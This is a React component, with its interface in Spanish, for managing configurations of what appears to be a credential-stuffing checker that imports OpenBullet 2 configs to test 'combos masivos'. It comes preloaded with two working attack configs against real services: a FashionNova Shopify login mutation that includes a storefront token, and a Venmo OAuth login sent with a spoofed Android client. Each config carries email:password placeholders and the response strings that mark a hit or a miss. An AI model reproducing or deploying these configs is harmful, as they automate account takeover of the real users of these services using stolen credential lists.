
'use client'

import { useState } from 'react'
import { Card, CardContent, CardDescription, CardHeader, CardTitle } from '@/components/ui/card'
import { Button } from '@/components/ui/button'
import { Input } from '@/components/ui/input'
import { Label } from '@/components/ui/label'
import { Select, SelectContent, SelectItem, SelectTrigger, SelectValue } from '@/components/ui/select'
import { Textarea } from '@/components/ui/textarea'
import { Badge } from '@/components/ui/badge'
import { Switch } from '@/components/ui/switch'
import { Separator } from '@/components/ui/separator'
import { Plus, Settings, Edit, Trash2, Save, Target, CheckCircle, XCircle, Upload, FileText, Download } from 'lucide-react'
import { Dialog, DialogContent, DialogDescription, DialogHeader, DialogTitle, DialogTrigger } from '@/components/ui/dialog'
import { Tabs, TabsContent, TabsList, TabsTrigger } from '@/components/ui/tabs'

export function ConfigManager() {
  // Demo imported configs
  const [configs, setConfigs] = useState<any[]>([
    {
      id: 'demo-ob2-1',
      name: 'fashionNova v1',
      method: 'POST',
      url: 'https://fnova.myshopify.com/api/2024-01/graphql',
      headers: {
        'host': 'fnova.myshopify.com',
        'accept': 'application/json',
        'x-shopify-storefront-access-token': '5b23d4000b2400368684509f7be7d1d1',
        'content-type': 'application/json'
      },
      body: '{"operationName":"customerAccessTokenCreate","variables":{"input":{"email":"{COMBO_USER}","password":"{COMBO_PASS}"}},"query":"mutation customerAccessTokenCreate($input: CustomerAccessTokenCreateInput!) { customerAccessTokenCreate(input: $input) { customerAccessToken { accessToken expiresAt } customerUserErrors { field message } userErrors { field message } } }"}',
      successConditions: [
        { type: 'response_contains', value: '{"accessToken":"', enabled: true }
      ],
      failureConditions: [
        { type: 'response_contains', value: '"customerAccessToken":null,', enabled: true }
      ],
      comboFormat: 'email:password',
      separator: ':',
      timeout: 10,
      retries: 3,
      description: 'FashionNova login testing - Imported from OpenBullet 2',
      source: 'OpenBullet 2',
      originalFile: 'fashionNova v1.opk',
      createdAt: new Date(Date.now() - 3600000)
    },
    {
      id: 'demo-ob2-2', 
      name: 'Venmo FC',
      method: 'POST',
      url: 'https://api.venmo.com/v1/oauth/access_token',
      headers: {
        'Accept-Encoding': 'gzip',
        'Accept-Language': 'en-US',
        'application-id': 'com.venmo',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Host': 'api.venmo.com',
        'User-Agent': 'Venmo/9.32.1 Android/7.1.2 samsung/SM-G9880'
      },
      body: 'phone_email_or_username={COMBO_USER}&password={COMBO_PASS}&client_id=4',
      successConditions: [
        { type: 'response_contains', value: 'Unable to complete your request. Please try again later', enabled: true }
      ],
      failureConditions: [
        { type: 'response_contains', value: 'Login not allowed', enabled: true },
        { type: 'response_contains', value: 'Your email or password was incorrect', enabled: true }
      ],
      comboFormat: 'email:password',
      separator: ':',
      timeout: 15,
      retries: 2,
      description: 'Venmo login validation - Imported from OpenBullet 2',
      source: 'OpenBullet 2',
      originalFile: 'Venmo FC.opk',
      createdAt: new Date(Date.now() - 7200000)
    }
  ])
  
  const [isDialogOpen, setIsDialogOpen] = useState(false)
  const [isImportDialogOpen, setIsImportDialogOpen] = useState(false)
  const [editingConfig, setEditingConfig] = useState<any>(null)
  const [importFile, setImportFile] = useState<File | null>(null)
  const [importPreview, setImportPreview] = useState<any>(null)
  const [importing, setImporting] = useState(false)
  
  const [formData, setFormData] = useState({
    name: '',
    method: 'POST',
    url: '',
    headers: '{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}',
    body: '{"username": "{COMBO_USER}", "password": "{COMBO_PASS}"}',
    params: '{}',
    description: '',
    comboFormat: 'email:password',
    separator: ':',
    successConditions: [
      { type: 'status_code', value: '200', enabled: true },
      { type: 'response_contains', value: 'success', enabled: false },
      { type: 'response_not_contains', value: 'error', enabled: true }
    ],
    failureConditions: [
      { type: 'status_code', value: '401', enabled: true },
      { type: 'response_contains', value: 'invalid', enabled: true },
      { type: 'response_contains', value: 'incorrect', enabled: true }
    ],
    timeout: 10,
    retries: 2,
    followRedirects: true
  })

  const resetForm = () => {
    setFormData({
      name: '',
      method: 'POST',
      url: '',
      headers: '{"Content-Type": "application/json", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}',
      body: '{"username": "{COMBO_USER}", "password": "{COMBO_PASS}"}',
      params: '{}',
      description: '',
      comboFormat: 'email:password',
      separator: ':',
      successConditions: [
        { type: 'status_code', value: '200', enabled: true },
        { type: 'response_contains', value: 'success', enabled: false },
        { type: 'response_not_contains', value: 'error', enabled: true }
      ],
      failureConditions: [
        { type: 'status_code', value: '401', enabled: true },
        { type: 'response_contains', value: 'invalid', enabled: true },
        { type: 'response_contains', value: 'incorrect', enabled: true }
      ],
      timeout: 10,
      retries: 2,
      followRedirects: true
    })
    setEditingConfig(null)
  }

  const updateCondition = (conditionType: 'successConditions' | 'failureConditions', index: number, field: string, value: any) => {
    setFormData(prev => ({
      ...prev,
      [conditionType]: prev[conditionType].map((cond, i) => 
        i === index ? { ...cond, [field]: value } : cond
      )
    }))
  }

  const addCondition = (conditionType: 'successConditions' | 'failureConditions') => {
    setFormData(prev => ({
      ...prev,
      [conditionType]: [
        ...prev[conditionType],
        { type: 'response_contains', value: '', enabled: true }
      ]
    }))
  }

  const removeCondition = (conditionType: 'successConditions' | 'failureConditions', index: number) => {
    setFormData(prev => ({
      ...prev,
      [conditionType]: prev[conditionType].filter((_, i) => i !== index)
    }))
  }

  const handleSave = async () => {
    try {
      const configData = {
        ...formData,
        headers: JSON.parse(formData.headers || '{}'),
        params: JSON.parse(formData.params || '{}')
      }
      
      const newConfig = {
        id: Date.now().toString(),
        ...configData,
        createdAt: new Date()
      }
      
      setConfigs([...configs, newConfig])
      setIsDialogOpen(false)
      resetForm()
    } catch (error) {
      console.error('Error saving config:', error)
    }
  }

  const handleDelete = (id: string) => {
    setConfigs(configs.filter(config => config.id !== id))
  }

  const handleImportFile = async (e: React.ChangeEvent<HTMLInputElement>) => {
    const file = e.target.files?.[0]
    if (!file || !file.name.endsWith('.opk')) {
      alert('Por favor selecciona un archivo .opk válido')
      return
    }
    
    setImportFile(file)
    setImporting(true)
    
    try {
      // Simulate parsing for web version (no JSZip dependency)
      const mockParsedConfig = {
        name: file.name.replace('.opk', ''),
        method: 'POST',
        url: 'https://example.com/api/login',
        successConditions: [{ type: 'response_contains', value: 'success', enabled: true }],
        failureConditions: [{ type: 'response_contains', value: 'error', enabled: true }],
        comboFormat: 'email:password',
        description: `Imported from ${file.name}`
      }
      setImportPreview(mockParsedConfig)
    } catch (error) {
      console.error('Error parsing config:', error)
      alert('Error al parsear el config de OpenBullet')
    } finally {
      setImporting(false)
    }
  }

  const handleImportConfig = () => {
    if (!importPreview) return
    
    const newConfig = {
      id: Date.now().toString(),
      ...importPreview,
      createdAt: new Date(),
      source: 'OpenBullet 2',
      originalFile: importFile?.name
    }
    
    setConfigs([...configs, newConfig])
    setIsImportDialogOpen(false)
    setImportFile(null)
    setImportPreview(null)
  }

  const resetImport = () => {
    setImportFile(null)
    setImportPreview(null)
    setImporting(false)
  }

  return (
    <div className="space-y-6">
      {/* Header */}
      <div className="flex justify-between items-center">
        <div>
          <h2 className="text-2xl font-bold">Configuraciones de API</h2>
          <p className="text-muted-foreground">Gestiona las configuraciones para testear APIs</p>
        </div>
        <div className="flex space-x-2">
          {/* Import OpenBullet Config */}
          <Dialog open={isImportDialogOpen} onOpenChange={setIsImportDialogOpen}>
            <DialogTrigger asChild>
              <Button variant="outline" className="flex items-center gap-2">
                <Upload className="h-4 w-4" />
                Importar OpenBullet
              </Button>
            </DialogTrigger>
            <DialogContent className="max-w-4xl">
              <DialogHeader>
                <DialogTitle className="flex items-center gap-2">
                  <FileText className="h-5 w-5" />
                  Importar Config de OpenBullet 2
                </DialogTitle>
                <DialogDescription>
                  Carga un archivo .opk de OpenBullet 2 y conviértelo automáticamente
                </DialogDescription>
              </DialogHeader>
              
              <div className="space-y-6">
                <div className="space-y-4">
                  <div>
                    <Label className="text-sm font-medium">Archivo .opk de OpenBullet 2</Label>
                    <Input
                      type="file"
                      accept=".opk"
                      onChange={handleImportFile}
                      disabled={importing}
                    />
                  </div>
                  
                  {importing && (
                    <div className="text-center py-4">
                      <div className="text-sm text-muted-foreground">Analizando config de OpenBullet...</div>
                    </div>
                  )}
                </div>
                
                {importPreview && (
                  <div className="space-y-4 border-t pt-4">
                    <h3 className="text-lg font-semibold">Preview de Conversión</h3>
                    
                    <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                      <div className="space-y-3">
                        <div>
                          <Label className="text-sm font-medium">Config Original</Label>
                          <div className="p-3 bg-muted rounded-md space-y-1 text-sm">
                            <div><span className="font-medium">Nombre:</span> {importPreview.name}</div>
                            <div><span className="font-medium">Archivo:</span> {importFile?.name}</div>
                            <div><span className="font-medium">Formato:</span> {importPreview.comboFormat}</div>
                            <div><span className="font-medium">Método:</span> {importPreview.method}</div>
                          </div>
                        </div>
                        
                        <div>
                          <Label className="text-sm font-medium">URL</Label>
                          <code className="block p-2 bg-muted rounded text-xs">
                            {importPreview.url}
                          </code>
                        </div>
                      </div>
                      
                      <div className="space-y-3">
                        <div>
                          <Label className="text-sm font-medium">Condiciones Detectadas</Label>
                          <div className="space-y-2">
                            <div>
                              <div className="text-xs font-medium text-green-600">✅ Éxito</div>
                              <div className="space-y-1">
                                {importPreview.successConditions?.map((cond: any, idx: number) => (
                                  <Badge key={idx} variant="default" className="bg-green-100 text-green-800 text-xs mr-1">
                                    {cond.type}: {cond.value}
                                  </Badge>
                                ))}
                              </div>
                            </div>
                            <div>
                              <div className="text-xs font-medium text-red-600">❌ Fallo</div>
                              <div className="space-y-1">
                                {importPreview.failureConditions?.map((cond: any, idx: number) => (
                                  <Badge key={idx} variant="destructive" className="text-xs mr-1">
                                    {cond.type}: {cond.value}
                                  </Badge>
                                ))}
                              </div>
                            </div>
                          </div>
                        </div>
                      </div>
                    </div>
                    
                    {importPreview.body && (
                      <div>
                        <Label className="text-sm font-medium">Body convertido</Label>
                        <pre className="p-3 bg-muted rounded text-xs whitespace-pre-wrap">
                          {importPreview.body}
                        </pre>
                      </div>
                    )}
                  </div>
                )}
              </div>
              
              <div className="flex justify-end space-x-2 pt-4 border-t">
                <Button variant="outline" onClick={() => {setIsImportDialogOpen(false); resetImport()}}>
                  Cancelar
                </Button>
                {importPreview && (
                  <Button onClick={handleImportConfig} className="bg-green-600 hover:bg-green-700">
                    <Download className="h-4 w-4 mr-2" />
                    Importar Config
                  </Button>
                )}
              </div>
            </DialogContent>
          </Dialog>
          
          {/* New Config */}
          <Dialog open={isDialogOpen} onOpenChange={setIsDialogOpen}>
            <DialogTrigger asChild>
              <Button className="flex items-center gap-2">
                <Plus className="h-4 w-4" />
                Nueva Configuración
              </Button>
            </DialogTrigger>
            <DialogContent className="max-w-4xl max-h-[90vh] overflow-y-auto">
              <DialogHeader>
                <DialogTitle className="flex items-center gap-2">
                  <Target className="h-5 w-5" />
                  {editingConfig ? 'Editar Configuración' : 'Nueva Configuración Avanzada'}
                </DialogTitle>
                <DialogDescription>
                  Configura testing avanzado para detección de combos válidos
                </DialogDescription>
              </DialogHeader>
            
              <Tabs defaultValue="basic" className="w-full">
                <TabsList className="grid w-full grid-cols-4">
                  <TabsTrigger value="basic">Básico</TabsTrigger>
                  <TabsTrigger value="combos">Combos</TabsTrigger>
                  <TabsTrigger value="detection">Detección</TabsTrigger>
                  <TabsTrigger value="advanced">Avanzado</TabsTrigger>
                </TabsList>
                
                {/* Basic Tab */}
                <TabsContent value="basic" className="space-y-4">
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label htmlFor="name" className="text-right">Nombre</Label>
                    <Input
                      id="name"
                      className="col-span-3"
                      value={formData.name}
                      onChange={(e) => setFormData({...formData, name: e.target.value})}
                      placeholder="Login Checker API"
                    />
                  </div>
                  
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label htmlFor="method" className="text-right">Método</Label>
                    <Select
                      value={formData.method}
                      onValueChange={(value) => setFormData({...formData, method: value})}
                    >
                      <SelectTrigger className="col-span-3">
                        <SelectValue />
                      </SelectTrigger>
                      <SelectContent>
                        <SelectItem value="GET">GET</SelectItem>
                        <SelectItem value="POST">POST</SelectItem>
                        <SelectItem value="PUT">PUT</SelectItem>
                        <SelectItem value="DELETE">DELETE</SelectItem>
                        <SelectItem value="PATCH">PATCH</SelectItem>
                      </SelectContent>
                    </Select>
                  </div>
                  
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label htmlFor="url" className="text-right">URL</Label>
                    <Input
                      id="url"
                      className="col-span-3"
                      value={formData.url}
                      onChange={(e) => setFormData({...formData, url: e.target.value})}
                      placeholder="https://login.ejemplo.com/api/auth"
                    />
                  </div>
                  
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label htmlFor="headers" className="text-right">Headers</Label>
                    <Textarea
                      id="headers"
                      className="col-span-3 h-24"
                      value={formData.headers}
                      onChange={(e) => setFormData({...formData, headers: e.target.value})}
                      placeholder='{"Content-Type": "application/json"}'
                    />
                  </div>
                  
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label htmlFor="body" className="text-right">Body</Label>
                    <Textarea
                      id="body"
                      className="col-span-3 h-24"
                      value={formData.body}
                      onChange={(e) => setFormData({...formData, body: e.target.value})}
                      placeholder='{"username": "{COMBO_USER}", "password": "{COMBO_PASS}"}'
                    />
                  </div>
                </TabsContent>

                {/* Combos Tab */}
                <TabsContent value="combos" className="space-y-4">
                  <div className="space-y-4">
                    <h4 className="font-semibold">Configuración de Combos</h4>
                    <div className="grid grid-cols-4 items-center gap-4">
                      <Label className="text-right">Formato</Label>
                      <Select
                        value={formData.comboFormat}
                        onValueChange={(value) => setFormData({...formData, comboFormat: value})}
                      >
                        <SelectTrigger className="col-span-3">
                          <SelectValue />
                        </SelectTrigger>
                        <SelectContent>
                          <SelectItem value="email:password">email:password</SelectItem>
                          <SelectItem value="username:password">username:password</SelectItem>
                          <SelectItem value="phone:password">phone:password</SelectItem>
                          <SelectItem value="custom">Personalizado</SelectItem>
                        </SelectContent>
                      </Select>
                    </div>
                    
                    <div className="grid grid-cols-4 items-center gap-4">
                      <Label className="text-right">Separador</Label>
                      <Input
                        className="col-span-3"
                        value={formData.separator}
                        onChange={(e) => setFormData({...formData, separator: e.target.value})}
                        placeholder=":"
                      />
                    </div>
                    
                    <div className="col-span-4">
                      <Label className="text-sm font-medium">Variables disponibles:</Label>
                      <div className="mt-2 p-3 bg-muted rounded-md">
                        <div className="text-sm space-y-1">
                          <div><code className="bg-background px-2 py-1 rounded">{'{COMBO_USER}'}</code> - Primera parte del combo</div>
                          <div><code className="bg-background px-2 py-1 rounded">{'{COMBO_PASS}'}</code> - Segunda parte del combo</div>
                          <div><code className="bg-background px-2 py-1 rounded">{'{COMBO_FULL}'}</code> - Combo completo</div>
                        </div>
                      </div>
                    </div>
                  </div>
                </TabsContent>

                {/* Detection Tab */}
                <TabsContent value="detection" className="space-y-6">
                  {/* Success Conditions */}
                  <div className="space-y-4">
                    <div className="flex items-center justify-between">
                      <h4 className="font-semibold flex items-center gap-2">
                        <CheckCircle className="h-4 w-4 text-green-600" />
                        Condiciones de Éxito
                      </h4>
                      <Button variant="outline" size="sm" onClick={() => addCondition('successConditions')}>
                        <Plus className="h-3 w-3 mr-1" />
                        Agregar
                      </Button>
                    </div>
                    
                    <div className="space-y-3">
                      {formData.successConditions.map((condition, index) => (
                        <div key={index} className="flex items-center gap-3 p-3 border rounded-lg">
                          <Switch
                            checked={condition.enabled}
                            onCheckedChange={(checked) => updateCondition('successConditions', index, 'enabled', checked)}
                          />
                          <Select
                            value={condition.type}
                            onValueChange={(value) => updateCondition('successConditions', index, 'type', value)}
                          >
                            <SelectTrigger className="w-48">
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="status_code">Código de Estado</SelectItem>
                              <SelectItem value="response_contains">Respuesta Contiene</SelectItem>
                              <SelectItem value="response_not_contains">Respuesta NO Contiene</SelectItem>
                              <SelectItem value="header_contains">Header Contiene</SelectItem>
                            </SelectContent>
                          </Select>
                          <Input
                            value={condition.value}
                            onChange={(e) => updateCondition('successConditions', index, 'value', e.target.value)}
                            placeholder={condition.type === 'status_code' ? '200' : 'success'}
                            className="flex-1"
                          />
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => removeCondition('successConditions', index)}
                          >
                            <Trash2 className="h-3 w-3" />
                          </Button>
                        </div>
                      ))}
                    </div>
                  </div>

                  <Separator />

                  {/* Failure Conditions */}
                  <div className="space-y-4">
                    <div className="flex items-center justify-between">
                      <h4 className="font-semibold flex items-center gap-2">
                        <XCircle className="h-4 w-4 text-red-600" />
                        Condiciones de Fallo
                      </h4>
                      <Button variant="outline" size="sm" onClick={() => addCondition('failureConditions')}>
                        <Plus className="h-3 w-3 mr-1" />
                        Agregar
                      </Button>
                    </div>
                    
                    <div className="space-y-3">
                      {formData.failureConditions.map((condition, index) => (
                        <div key={index} className="flex items-center gap-3 p-3 border rounded-lg">
                          <Switch
                            checked={condition.enabled}
                            onCheckedChange={(checked) => updateCondition('failureConditions', index, 'enabled', checked)}
                          />
                          <Select
                            value={condition.type}
                            onValueChange={(value) => updateCondition('failureConditions', index, 'type', value)}
                          >
                            <SelectTrigger className="w-48">
                              <SelectValue />
                            </SelectTrigger>
                            <SelectContent>
                              <SelectItem value="status_code">Código de Estado</SelectItem>
                              <SelectItem value="response_contains">Respuesta Contiene</SelectItem>
                              <SelectItem value="response_not_contains">Respuesta NO Contiene</SelectItem>
                              <SelectItem value="header_contains">Header Contiene</SelectItem>
                            </SelectContent>
                          </Select>
                          <Input
                            value={condition.value}
                            onChange={(e) => updateCondition('failureConditions', index, 'value', e.target.value)}
                            placeholder={condition.type === 'status_code' ? '401' : 'error'}
                            className="flex-1"
                          />
                          <Button
                            variant="outline"
                            size="sm"
                            onClick={() => removeCondition('failureConditions', index)}
                          >
                            <Trash2 className="h-3 w-3" />
                          </Button>
                        </div>
                      ))}
                    </div>
                  </div>
                </TabsContent>

                {/* Advanced Tab */}
                <TabsContent value="advanced" className="space-y-4">
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label className="text-right">Timeout (seg)</Label>
                    <Input
                      type="number"
                      className="col-span-3"
                      value={formData.timeout}
                      onChange={(e) => setFormData({...formData, timeout: parseInt(e.target.value) || 10})}
                    />
                  </div>
                  
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label className="text-right">Reintentos</Label>
                    <Input
                      type="number"
                      className="col-span-3"
                      value={formData.retries}
                      onChange={(e) => setFormData({...formData, retries: parseInt(e.target.value) || 1})}
                    />
                  </div>
                  
                  <div className="grid grid-cols-4 items-center gap-4">
                    <Label className="text-right">Redirecciones</Label>
                    <div className="col-span-3">
                      <Switch
                        checked={formData.followRedirects}
                        onCheckedChange={(checked) => setFormData({...formData, followRedirects: checked})}
                      />
                    </div>
                  </div>
                </TabsContent>
              </Tabs>

              <div className="flex justify-end space-x-2 pt-4 border-t">
                <Button variant="outline" onClick={() => {setIsDialogOpen(false); resetForm()}}>
                  Cancelar
                </Button>
                <Button onClick={handleSave} className="bg-green-600 hover:bg-green-700">
                  <Save className="h-4 w-4 mr-2" />
                  Guardar Configuración
                </Button>
              </div>
            </DialogContent>
          </Dialog>
        </div>
      </div>

      {/* Configs List */}
      <div className="grid gap-4">
        {configs.length === 0 ? (
          <Card>
            <CardContent className="flex flex-col items-center justify-center py-12">
              <Target className="h-12 w-12 text-muted-foreground mb-4" />
              <h3 className="text-lg font-semibold mb-2">No hay configuraciones</h3>
              <p className="text-muted-foreground text-center mb-4">
                Crea tu primera configuración para empezar a testear combos masivos
              </p>
              <Button onClick={() => setIsDialogOpen(true)}>
                <Plus className="h-4 w-4 mr-2" />
                Nueva Configuración
              </Button>
            </CardContent>
          </Card>
        ) : (
          configs.map((config) => (
            <Card key={config.id}>
              <CardHeader>
                <div className="flex justify-between items-start">
                  <div className="space-y-2">
                    <CardTitle className="flex items-center gap-2">
                      <Target className="h-4 w-4" />
                      {config.name}
                      <Badge variant="outline">{config.method}</Badge>
                      <Badge variant="secondary">{config.comboFormat}</Badge>
                      {config.source === 'OpenBullet 2' && (
                        <Badge variant="default" className="bg-purple-100 text-purple-800">
                          <FileText className="h-3 w-3 mr-1" />
                          OpenBullet
                        </Badge>
                      )}
                    </CardTitle>
                    <CardDescription>
                      {config.description}
                      {config.source === 'OpenBullet 2' && config.originalFile && (
                        <div className="text-xs text-purple-600 mt-1">
                          📁 Importado desde: {config.originalFile}
                        </div>
                      )}
                    </CardDescription>
                  </div>
                  <div className="flex space-x-2">
                    <Button variant="outline" size="icon">
                      <Edit className="h-4 w-4" />
                    </Button>
                    <Button variant="outline" size="icon" onClick={() => handleDelete(config.id)}>
                      <Trash2 className="h-4 w-4" />
                    </Button>
                  </div>
                </div>
              </CardHeader>
              <CardContent>
                <div className="space-y-4">
                  <div>
                    <Label className="text-sm font-semibold">URL</Label>
                    <code className="block mt-1 p-2 bg-muted rounded text-xs">
                      {config.url}
                    </code>
                  </div>
                  
                  <div className="grid grid-cols-1 md:grid-cols-2 gap-4">
                    <div>
                      <Label className="text-sm font-semibold text-green-600">✅ Condiciones de Éxito</Label>
                      <div className="space-y-1 mt-2">
                        {config.successConditions?.map((condition: any, idx: number) => (
                          <Badge key={idx} variant="default" className="bg-green-100 text-green-800 text-xs mr-1">
                            {condition.type}: {condition.value}
                          </Badge>
                        ))}
                      </div>
                    </div>
                    <div>
                      <Label className="text-sm font-semibold text-red-600">❌ Condiciones de Fallo</Label>
                      <div className="space-y-1 mt-2">
                        {config.failureConditions?.map((condition: any, idx: number) => (
                          <Badge key={idx} variant="destructive" className="text-xs mr-1">
                            {condition.type}: {condition.value}
                          </Badge>
                        ))}
                      </div>
                    </div>
                  </div>
                  
                  <div className="flex items-center gap-4 text-xs text-muted-foreground">
                    <span>Timeout: {config.timeout}s</span>
                    <span>Reintentos: {config.retries}</span>
                    <span>Redirecciones: {config.followRedirects ? 'Sí' : 'No'}</span>
                  </div>
                </div>
              </CardContent>
            </Card>
          ))
        )}
      </div>
    </div>
  )
}
